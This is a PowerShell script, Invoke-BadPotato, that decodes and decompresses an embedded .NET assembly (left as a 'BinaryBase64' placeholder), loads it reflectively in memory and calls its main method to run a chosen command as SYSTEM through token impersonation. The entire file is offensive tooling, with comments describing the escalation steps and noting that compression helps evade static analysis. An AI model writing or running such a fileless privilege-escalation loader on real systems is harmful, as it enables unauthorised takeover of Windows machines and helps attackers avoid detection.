function Invoke-BadPotato
{
    [CmdletBinding()]
    Param (
        [String]
        $Command = "whoami"  # Default command to execute with elevated privileges (e.g., "whoami" to verify escalation to NT AUTHORITY\SYSTEM).
    )
    
    # Step 1: Decode the Base64-encoded binary data.
    # "BinaryBase64" is a placeholder for the actual Base64 string of the BadPotato .NET assembly (compiled C# code).
    # This creates a MemoryStream from the decoded bytes.
    $a = New-Object IO.MemoryStream(,[Convert]::FromBAsE64String("BinaryBase64"))  # Decodes the embedded BadPotato binary into a byte array and loads it into a stream.
    
    # Step 2: Decompress the binary using GZip.
    # The binary is compressed to reduce size and obfuscate it (common for payloads to evade static analysis).
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)  # Creates a GZipStream to decompress the input stream ($a).
    
    # Step 3: Copy decompressed data to a new MemoryStream.
    # This extracts the full .NET assembly bytes without writing to disk.
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )  # Copies the decompressed bytes from $decompressed to $output.
    
    # Step 4: Convert to byte array and load the assembly into memory.
    # [System.Reflection.Assembly]::Load() dynamically loads the .NET assembly (BadPotato.dll) into the current AppDomain.
    # This enables access to its classes and methods (e.g., BadPotato.ExecuteRectangle) without installing or dropping files.
    [byte[]] $byteOutArray = $output.ToArray()  # Converts the MemoryStream to a byte array.
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)  # Loads the BadPotato assembly into memory ($RAS is the loaded Assembly object).
    
    # Step 5: Redirect console output to capture the command's results.
    # BadPotato's main() method outputs to stdout, so this redirects it to a StringWriter for later retrieval.
    $OldConsoleOut = [Console]::Out  # Saves the original console output stream.
    $StringWriter = New-Object IO.StringWriter  # Creates a StringWriter to capture output.
    [Console]::SetOut($StringWriter)  # Redirects console output to the StringWriter.
    
    # Step 6: Execute the exploit.
    # Calls the static main method in the BadPotato.ExecuteRectangle class.
    # $Command.Split(" ") passes arguments as an array (e.g., for "whoami /all", it becomes @("whoami", "/all")).
    # The exploit:
    # - Checks for SeImpersonatePrivilege (or similar).
    # - Creates a named pipe or DCOM activation to coerce a SYSTEM token (e.g., via RPC/DCOM impersonation).
    # - Uses CreateProcessWithTokenW to spawn the command as SYSTEM.
    # - If successful, the command runs elevated; output is captured here.
    [BadPotato.ExecuteRectangle]::main($Command.Split(" "))  # Invokes the exploit's main method with command args.
    
    # Step 7: Restore console output and return results.
    # Resets stdout to original and extracts the captured string.
    [Console]::SetOut($OldConsoleOut)  # Restores the original console output.
    $Results = $StringWriter.ToString()  # Converts captured output to a string.
    $Results  # Returns the results (e.g., "nt authority\system" if escalated).
}